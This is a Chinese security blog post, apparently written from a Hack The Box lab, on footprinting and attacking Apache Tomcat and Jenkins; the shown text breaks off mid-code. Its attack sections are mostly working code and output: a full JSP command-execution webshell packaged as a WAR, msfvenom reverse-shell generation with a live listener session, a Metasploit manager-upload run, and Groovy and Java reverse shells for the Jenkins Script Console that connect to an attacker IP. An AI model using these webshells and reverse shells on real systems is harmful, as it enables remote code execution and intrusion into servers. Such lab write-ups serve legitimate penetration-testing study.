<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>关于Tomcat | Ak4izZ&#39;s 滴博客儿</title>
  <meta name="author" content="Ak4izZ">
  
  <meta name="description" content="记录一下Tomacat和Jenkins的相关内容"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="关于Tomcat"/>
  <meta property="og:site_name" content="Ak4izZ&#39;s 滴博客儿"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Ak4izZ&#39;s 滴博客儿" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 5.4.2"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Ak4izZ&#39;s 滴博客儿</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 关于Tomcat</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>记录一下Tomacat和Jenkins的相关内容</p>
<span id="more"></span>

<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><blockquote>
<p>Tomcat是一个基于Java的开源Web服务器，它实现了Java Servlet、JavaServer Pages（JSP）和Java WebSocket等Java平台相关技术。Tomcat被广泛用于Java Web应用程序的开发和部署，包括Spring、Struts、Hibernate等框架。</p>
<p>Tomcat的主要功能包括：</p>
<ul>
<li>提供Java Web应用程序的Servlet和JSP容器。</li>
<li>支持HTTPS和SSL&#x2F;TLS协议。</li>
<li>提供基于角色的访问控制和身份验证。</li>
<li>支持连接器和集群等高可用性和负载均衡功能。</li>
<li>提供管理和监视工具，如Tomcat Manager和JMX代理等。</li>
</ul>
</blockquote>
<h2 id="Discovery-x2F-Footprinting"><a href="#Discovery-x2F-Footprinting" class="headerlink" title="Discovery&#x2F;Footprinting"></a>Discovery&#x2F;Footprinting</h2><p><strong>404page</strong><br>Tomcat的站一般404页面会显示版本信息。</p>
<img src="/2023/04/30/%E5%85%B3%E4%BA%8ETomcat/tomcat_invalid.png" class title="img">

<p>自定义的404页面可能就不会泄露这些信息，但如果&#x2F;docs&#x2F;页面没被删除，也可以通过它了解。后台地址<code>/manager/html</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ <span class="token function">curl</span> <span class="token parameter variable">-s</span> http://app-dev.inlanefreight.local:8080/docs/ <span class="token operator">|</span> <span class="token function">grep</span> Tomcat 

<span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token operator">&lt;</span>META http-equiv<span class="token operator">=</span><span class="token string">"Content-Type"</span> <span class="token assign-left variable">content</span><span class="token operator">=</span><span class="token string">"text/html; charset=UTF-8"</span><span class="token operator">></span><span class="token operator">&lt;</span>link <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"./images/docs-stylesheet.css"</span> <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span> <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"text/css"</span><span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span>Apache Tomcat <span class="token number">9</span> <span class="token punctuation">(</span><span class="token number">9.0</span>.30<span class="token punctuation">)</span> - Documentation Index<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>meta <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"author"</span> 

<span class="token operator">&lt;</span>SNIP<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><strong>一般结构</strong></p>
<pre class="line-numbers language-shell-session" data-language="shell-session"><code class="language-shell-session"><span class="token output">├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>Bin</code>文件夹存储启动和运行 Tomcat 服务器所需的脚本和二进制文件。<code>Conf</code> 文件夹存储 Tomcat 使用的各种配置文件。<code>Tomcat-users.xml</code> 文件存储用户凭据及其分配的角色。<code>Lib</code> 文件夹包含 Tomcat 运行所需的各种 JAR 文件。<code>log</code>和<code>temp</code>存储临时日志文件。<code>Webapps</code> 文件夹是 Tomcat 的默认 <code>webbroot</code>，并托管所有应用程序。<code>work</code>文件夹充当缓存，用于在运行时存储数据。</p>
<p>而每个<code>webapps</code>下的文件夹基本是如下结构</p>
<pre class="line-numbers language-shell-session" data-language="shell-session"><code class="language-shell-session"><span class="token output">webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中最重要的文件是 WEB-INF&#x2F;web.xml，它被称为部署描述符。此文件存储有关应用程序使用的路由以及处理这些路由的类的信息。应用程序使用的所有已编译类都应该存储在 WEB-INF&#x2F;classes 文件夹中。这些类可能包含重要的业务逻辑和敏感信息。这些文件中的任何漏洞都可能导致对网站的破坏。Lib 文件夹存储特定应用程序所需的库。JSP 文件夹存储 JakartaServerPages (jSP) ，以前称为 JavaScerverPages，和Apache服务器上的PHP文件对应。</p>
<p>下面是一个示例 web.xml 文件。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span>

<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">web-app</span> <span class="token name">PUBLIC</span> <span class="token string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span> <span class="token string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>AdminServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.inlanefreight.api.AdminServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>AdminServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个文件定义了一个叫AdminServlet的servlet，并映射到类<code>com.inlanefreight.api.AdminServlet</code>中。Java的这种命名方式在磁盘内的路径对应的是<code>classes/com/inlanefreight/api/AdminServlet.class</code></p>
<p>再往下就定义了url的映射，这个配置会把发送到<code>/admin</code>的所有请求移交给<code>AdminServlet</code>处理，也就是<code>AdminServlet.class</code>。web.xml文件还是一个<code>LFI</code>验证常用的文件。</p>
<h2 id="Attacking"><a href="#Attacking" class="headerlink" title="Attacking"></a>Attacking</h2><h3 id="CVE-2020-1938-Ghostcat"><a href="#CVE-2020-1938-Ghostcat" class="headerlink" title="CVE-2020-1938 : Ghostcat"></a>CVE-2020-1938 : Ghostcat</h3><blockquote>
<p>before 9.0.31, 8.5.51, and 7.0.100,6.x were found vulnerable.</p>
</blockquote>
<p>这个漏洞是由 Tomcat 使用的 AJP 协议中的错误配置造成的。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-p</span> <span class="token number">8009,8080</span> app-dev.inlanefreight.local

Starting Nmap <span class="token number">7.80</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2021</span>-09-21 <span class="token number">20</span>:05 EDT
Nmap scan report <span class="token keyword">for</span> app-dev.inlanefreight.local <span class="token punctuation">(</span><span class="token number">10.129</span>.201.58<span class="token punctuation">)</span>
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.14s latency<span class="token punctuation">)</span>.

PORT     STATE SERVICE VERSION
<span class="token number">8009</span>/tcp <span class="token function">open</span>  ajp13   Apache Jserv <span class="token punctuation">(</span>Protocol v1.3<span class="token punctuation">)</span>
<span class="token number">8080</span>/tcp <span class="token function">open</span>  http    Apache Tomcat <span class="token number">9.0</span>.30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Tomcat Connector 是 Tomcat 与外部连接的通道，它使得 Catalina 能够接收来自外部的请求，传递给对应的 Web 应用程序处理，并返回请求的响应结果。</p>
<p>默认情况下，Tomcat 配置了两个 Connector，它们分别是 HTTP Connector 和 AJP Connector：</p>
<p>HTTP Connector：用于处理 HTTP 协议的请求（HTTP&#x2F;1.1），默认监听地址为 0.0.0.0:8080</p>
<p>AJP Connector：用于处理 AJP 协议的请求（AJP&#x2F;1.3），默认监听地址为 0.0.0.0:8009</p>
<p>HTTP Connector 就是用来提供我们经常用到的 HTTP Web 服务。而 AJP Connector，它使用的是 AJP 协议（Apache Jserv Protocol），AJP 协议可以理解为 HTTP 协议的二进制性能优化版本，它能降低 HTTP 请求的处理成本，因此主要在需要集群、反向代理的场景被使用。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">Poc</a></p>
<p>这个漏洞只能用于读取web应用文件夹内的文件，也就是说不能读取例如&#x2F;etc&#x2F;passwd之类的文件。但是我们可以通过读取&#x2F;WEB-INF文件夹内的敏感文件获得。</p>
<h4 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具"></a>检测工具</h4><p>长亭有一个在线的<a target="_blank" rel="noopener" href="https://www.chaitin.cn/zh/ghostcat">检测工具</a></p>
<p>另外他们的扫描器xray也支持检测。</p>
<h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>进入后台之后，用户可以随意部署自己的tomcat页面，这就给了我们上传部署webshell的机会。<br>可以整一个这样的小马</p>
<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*&quot;%&gt;
&lt;%
&#x2F;&#x2F;
&#x2F;&#x2F; JSP_KIT
&#x2F;&#x2F;
&#x2F;&#x2F; cmd.jsp &#x3D; Command Execution (unix)
&#x2F;&#x2F;
&#x2F;&#x2F; by: Unknown
&#x2F;&#x2F; modified: 27&#x2F;06&#x2F;2003
&#x2F;&#x2F;
%&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;FORM METHOD&#x3D;&quot;GET&quot; NAME&#x3D;&quot;myform&quot; ACTION&#x3D;&quot;&quot;&gt;
&lt;INPUT TYPE&#x3D;&quot;text&quot; NAME&#x3D;&quot;cmd&quot;&gt;
&lt;INPUT TYPE&#x3D;&quot;submit&quot; VALUE&#x3D;&quot;Send&quot;&gt;
&lt;&#x2F;FORM&gt;
&lt;pre&gt;
&lt;%
if (request.getParameter(&quot;cmd&quot;) !&#x3D; null) &#123;
        out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&lt;BR&gt;&quot;);
        Process p &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
        OutputStream os &#x3D; p.getOutputStream();
        InputStream in &#x3D; p.getInputStream();
        DataInputStream dis &#x3D; new DataInputStream(in);
        String disr &#x3D; dis.readLine();
        while ( disr !&#x3D; null ) &#123;
                out.println(disr); 
                disr &#x3D; dis.readLine(); 
                &#125;
        &#125;
%&gt;
&lt;&#x2F;pre&gt;
&lt;&#x2F;BODY&gt;&lt;&#x2F;HTML&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> <span class="token parameter variable">-r</span> backup.war cmd.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样就生成了一个war包。将其上传部署到tomcat上，燃火访问<code>/backup/cmd.jsp</code>，加上cmd参数便可以进行rce了。</p>
<img src="/2023/04/30/%E5%85%B3%E4%BA%8ETomcat/mgr_deploy.png" class title="image">

<img src="/2023/04/30/%E5%85%B3%E4%BA%8ETomcat/war_deployed.png" class title="img">

<h4 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h4><p>除此之外，msfvenom也可以生成反弹shell。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─<span class="token comment"># msfvenom --list payloads | grep jsp</span>
    java/jsp_shell_bind_tcp       Listen <span class="token keyword">for</span> a connection and spawn a <span class="token builtin class-name">command</span> shell
    java/jsp_shell_reverse_tcp    Connect back to attacker and spawn a <span class="token builtin class-name">command</span> shell
    
<span class="token comment"># 使用--list-options查看选项，这里制定以下监听ip和端口就行了</span>
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─<span class="token comment"># msfvenom -p java/jsp_shell_reverse_tcp --list-options</span>

<span class="token comment"># -f设置输出格式</span>
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─<span class="token comment"># msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.18 LPORT=4444 -f war > backup.war</span>
Payload size: <span class="token number">1089</span> bytes
Final size of war file: <span class="token number">1089</span> bytes

<span class="token comment"># 部署之后设置监听，然后点进/backup就可以连上反弹shell了</span>
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4444                   </span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4444</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.18<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.129</span>.201.58<span class="token punctuation">]</span> <span class="token number">60332</span>
<span class="token function">whoami</span>
tomcat
<span class="token comment"># 假设有个flag在某个目录下，但是我们不知道在哪</span>

<span class="token function">find</span> / <span class="token parameter variable">-name</span> *flag*
/var/lib/jenkins3/flag.txt
/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
/proc/sys/kernel/acpi_video_flags
/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu0/domain1/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain1/flags
/proc/sys/kernel/sched_domain/cpu2/domain0/flags
/proc/sys/kernel/sched_domain/cpu2/domain1/flags
/proc/sys/kernel/sched_domain/cpu3/domain0/flags
/proc/sys/kernel/sched_domain/cpu3/domain1/flags
/proc/sys/kernel/sched_domain/cpu4/domain0/flags
/proc/sys/kernel/sched_domain/cpu4/domain1/flags
/proc/sys/kernel/sched_domain/cpu5/domain0/flags
/proc/sys/kernel/sched_domain/cpu5/domain1/flags
/proc/kpageflags

<span class="token function">cat</span> /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
t0mcat_rc3_ftw<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="msf自动传马连接"><a href="#msf自动传马连接" class="headerlink" title="msf自动传马连接"></a>msf自动传马连接</h4><p>msf有<a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/">multi&#x2F;http&#x2F;tomcat_mgr_upload</a> 模块可以自动完成上述的攻击过程</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">></span> search tomcat upload

Matching Modules
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

   <span class="token comment">#   Name                                                         Disclosure Date  Rank       Check  Description</span>
   -   ----                                                         ---------------  ----       -----  -----------
   
   <span class="token number">3</span>   exploit/multi/http/tomcat_mgr_upload                         <span class="token number">2009</span>-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution


msf6 <span class="token operator">></span> use <span class="token number">3</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> show payloads

Compatible Payloads
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

   <span class="token comment">#   Name                                     Disclosure Date  Rank    Check  Description</span>
   -   ----                                     ---------------  ----    -----  -----------
   <span class="token number">5</span>  payload/java/jsp_shell_reverse_tcp                            normal  No     Java Command Shell, Reverse TCP Inline


msf6 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload <span class="token number">5</span>
payload <span class="token operator">=</span><span class="token operator">></span> java/shell_reverse_tcp
msf6 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOSTS tun0
msf6 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST tun0
LHOST <span class="token operator">=</span><span class="token operator">></span> tun0
msf6 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">4444</span>
LPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">4444</span>
msf6 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> RHOST <span class="token number">10.129</span>.201.58
RHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.129</span>.201.58
msf6 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> SET RPORT <span class="token number">8180</span>
msf6 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> RPORT <span class="token number">8180</span>
RPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8180</span>
msf6 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> HttpPassword root
HttpPassword <span class="token operator">=</span><span class="token operator">></span> root
msf6 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> HttpUsername tomcat
HttpUsername <span class="token operator">=</span><span class="token operator">></span> tomcat
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>设置完了run就行了。</p>
<h1 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h1><blockquote>
<p>Jenkins是一个基于Java的开源持续集成和持续交付（CI&#x2F;CD）工具，它可以帮助开发人员自动构建、测试和部署软件。Jenkins提供了丰富的插件和扩展功能，可以与多种开发工具和平台集成。</p>
<p>Jenkins的主要功能包括：</p>
<ul>
<li>提供基于Web的用户界面和管理控制台。</li>
<li>支持多种版本控制系统，如Git、Subversion等。</li>
<li>支持构建和测试工具，如Maven、Gradle、JUnit等。</li>
<li>提供丰富的插件和扩展功能，如邮件通知、发布构建物等。</li>
<li>支持分布式构建和集成测试。</li>
</ul>
</blockquote>
<h2 id="Discovery-x2F-Footprintting"><a href="#Discovery-x2F-Footprintting" class="headerlink" title="Discovery&#x2F;Footprintting"></a>Discovery&#x2F;Footprintting</h2><p>Jenkins默认运行在Tomcat8080端口上，也会附加在从服务器的5000端口。。</p>
<img src="/2023/04/30/%E5%85%B3%E4%BA%8ETomcat/jenkins_login.png" class title="Jenkins的登录入口">

<p>一般，Jenkins的默认口令是<code>admin:admin</code>，但也有很多情况下不设身份认证。</p>
<h2 id="Attacking-1"><a href="#Attacking-1" class="headerlink" title="Attacking"></a>Attacking</h2><p>进入Jenkins的后台之后，一个快速获得RCE的办法就是通过<code>ScriptConsole</code>.</p>
<h4 id="ScriptConsole"><a href="#ScriptConsole" class="headerlink" title="ScriptConsole"></a>ScriptConsole</h4><p>路由就是<code>http://url_to_target/script</code>，ScriptConsole允许用户执行自定义的Groovy脚本，一种与Python和Ruby相近的语言。Groovy源代码会被编译成Java字节码，然后再JRE中运行。</p>
<pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">r <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token interpolation-string"><span class="token string">"/bin/bash"</span></span><span class="token punctuation">,</span><span class="token interpolation-string"><span class="token string">"-c"</span></span><span class="token punctuation">,</span><span class="token interpolation-string"><span class="token string">"exec 5&lt;>/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 | while read line; do \$line 2>&amp;5 >&amp;5; done"</span></span><span class="token punctuation">]</span> <span class="token keyword">as</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这条语句可以执行reverse shell，使用TCP反向连接到攻击机上。</p>
<img src="/2023/04/30/%E5%85%B3%E4%BA%8ETomcat/image-20230430221845479.png" class title="image-20230430221845479">

<p>上面是目标机是Linux系统的情况。</p>
<p>当目标机是Windows时，可以试图添加一名用户然后通过RDP或者WinRM，或者使用PowerShell下载 <a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Invoke-PowerShellTcp.ps1</a>。</p>
<pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"># windows下的rce操作
<span class="token keyword">def</span> cmd <span class="token operator">=</span> <span class="token interpolation-string"><span class="token string">"cmd.exe /c dir"</span></span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">println</span><span class="token punctuation">(</span><span class="token interpolation-string"><span class="token string">"</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token expression">cmd<span class="token punctuation">.</span>text</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

# Java reverse shell
String host<span class="token operator">=</span><span class="token interpolation-string"><span class="token string">"localhost"</span></span><span class="token punctuation">;</span>
<span class="token keyword">int</span> port<span class="token operator">=</span><span class="token number">8044</span><span class="token punctuation">;</span>
String cmd<span class="token operator">=</span><span class="token interpolation-string"><span class="token string">"cmd.exe"</span></span><span class="token punctuation">;</span>
Process p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Socket s<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>InputStream pi<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pe<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getErrorStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> si<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token 